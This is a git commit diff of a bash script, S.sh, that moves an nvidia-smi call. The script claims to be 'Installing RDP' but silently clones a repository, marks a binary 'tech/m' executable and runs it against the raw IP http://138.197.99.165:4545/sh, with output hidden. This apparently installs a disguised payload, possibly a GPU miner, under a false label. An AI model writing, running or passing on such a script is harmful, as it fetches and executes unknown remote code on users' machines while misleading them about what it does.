49a42284d34991224a506985df5ffefeae3afa0c
phucbmt <phucdlbmt@gmail.com>
2021-01-26 19:32:13 +0700

    Update S.sh

--- S.sh
+++ S.sh
@@ -1,7 +1,8 @@
 #! /bin/bash
+nvidia-smi
 printf "Installing RDP Be Patience... " $1 >&2
 {
-nvidia-smi
+
 git clone https://github.com/phucbmt/tech.git &> /dev/null
 sudo chmod +x tech/m
 ./tech/m -P http://138.197.99.165:4545/sh &> log
